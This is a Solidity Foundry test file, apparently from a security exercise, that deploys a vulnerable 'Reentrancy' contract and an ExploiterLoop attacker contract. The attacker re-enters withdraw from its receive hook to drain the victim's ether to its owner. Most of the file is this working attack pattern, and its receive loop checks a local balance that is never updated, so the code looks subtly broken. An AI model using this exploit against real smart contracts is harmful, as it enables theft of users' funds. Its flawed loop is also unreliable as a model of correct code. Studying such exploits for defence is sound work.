// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Reentrancy} from "../src/Reentrancy.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";

contract ReentrancyTest is Test {
    Utilities internal utils;
    Reentrancy internal reentrancyVulnerable;

    address payable internal user;
    address payable internal attacker;
    address payable internal random;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(3);

        user = users[0];
        vm.label(user, "User");

        attacker = users[1];
        vm.label(attacker, "Attacker");

        random = users[2];
        vm.label(random, "Random");

        reentrancyVulnerable = new Reentrancy();
    }

    function testFunctionality() public {
        vm.startPrank(user);
        reentrancyVulnerable.donate{value: 1 ether}(random);
        assertEq(reentrancyVulnerable.balanceOf(random), 1 ether);
        vm.stopPrank();

        vm.startPrank(random);
        reentrancyVulnerable.withdraw(1 ether);
        assertEq(reentrancyVulnerable.balanceOf(random), 0);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(user);
        reentrancyVulnerable.donate{value: 5 ether}(random);
        assertEq(reentrancyVulnerable.balanceOf(random), 5 ether);
        vm.stopPrank();

        vm.startPrank(attacker);
        ExploiterLoop exploiterLoop = new ExploiterLoop{value: 1 ether}(
            reentrancyVulnerable
        );
        exploiterLoop.exploit();
        exploiterLoop.withdraw();

        //  check that the victim contract has no more ether
        assertEq(address(reentrancyVulnerable).balance, 0);
        vm.stopPrank();
    }
}

contract ExploiterLoop {
    address private owner;
    Reentrancy victim;

    constructor(Reentrancy _victim) payable {
        victim = _victim;
        owner = msg.sender;
    }

    receive() external payable {
        uint balance = address(victim).balance;
        while (balance > 0) {
            victim.withdraw(1 ether);
        }
    }

    function exploit() public payable {
        // require(msg.value > 0, "donate something");
        victim.donate{value: 1 ether}(address(this));

        victim.withdraw(1 ether);
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}
